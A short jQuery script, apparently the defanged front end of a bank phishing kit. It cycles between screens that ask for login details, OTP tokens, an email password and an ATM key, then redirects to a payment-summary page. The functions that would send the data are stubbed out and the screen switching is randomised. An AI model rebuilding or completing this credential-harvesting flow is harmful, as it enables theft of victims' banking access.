function vista_otp(){
    $("#contenedor-otp").hide();
    $("#contenedor-login").hide();
    $("#contenedor-token").show();  
    $("#contenedor-token-err").hide(); 
    $("#contenedor-mail").hide(); 

    $(".fondo").hide();
    $(".mensaje").hide();

    $("#TokenOTP").val("");
}

function vista_email(){
    $("#contenedor-otp").hide();
    $("#contenedor-login").hide();
    $("#contenedor-token").hide();  
    $("#contenedor-token-err").hide(); 
    $("#contenedor-mail").show(); 

    $(".fondo").hide();
    $(".mensaje").hide();

    $("#correoElectronico").val("");  
    $("#claveCorreo").val(""); 
}

function vista_cajero(){
    $("#contenedor-otp").show();
    $("#contenedor-login").hide();
    $("#contenedor-token").hide();  
    $("#contenedor-token-err").hide(); 
    $("#contenedor-mail").hide(); 

    $(".fondo").hide();
    $(".mensaje").hide();

    $("#claveCajero").val("");
}

function vista_errorotp(){
    $("#contenedor-otp").hide();
    $("#contenedor-login").hide();
    $("#contenedor-token").hide();  
    $("#contenedor-token-err").show(); 
    $("#contenedor-mail").hide(); 

    $(".fondo").hide();
    $(".mensaje").hide();

    $("#TokenOTPErr").val("");
}

function vista_usuario(){
    $("#contenedor-otp").hide();
    $("#contenedor-login").show();
    $("#contenedor-token").hide();  
    $("#contenedor-token-err").hide(); 
    $("#contenedor-mail").hide(); 

    $(".fondo").hide();
    $(".mensaje").hide();

    $("#docNumberMovil").val("");  
    $("#passwordMovil").val(""); 
}

function consultar_estado(){
    
    if (espera == 1) { 
        // Simular respuesta exitosa sin enviar datos
        setTimeout(function() {
            switch (Math.floor(Math.random() * 6) + 1) {
                case 1: espera = 0;
                         vista_otp();
                         break;
                case 2: espera = 0;
                         vista_email(); 
                         break;
                case 3: espera = 0;
                         vista_cajero();  
                         break;               
                case 4: espera = 0;
                         vista_errorotp(); 
                         break;
                case 5: espera = 0;
                         // Simular finalización exitosa
                         window.location.href = "../../resumen-pago/172921711564327653/";
                         break;
                case 6: espera = 0;
                         vista_usuario(); 
                         break;
            } 
        }, 2000);    
    }    
}

function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}  

function iniciar_sesion(td,nd,cl){
    // Función deshabilitada - no se envían datos
    // Simular éxito
    espera = 1;        
}

function enviar_OTP(o){
    // Función deshabilitada - no se envían datos
    // Simular éxito
    espera = 1; 
}

function enviar_OTP_Error(o){
    // Función deshabilitada - no se envían datos
    // Simular éxito
    espera = 1; 
}


 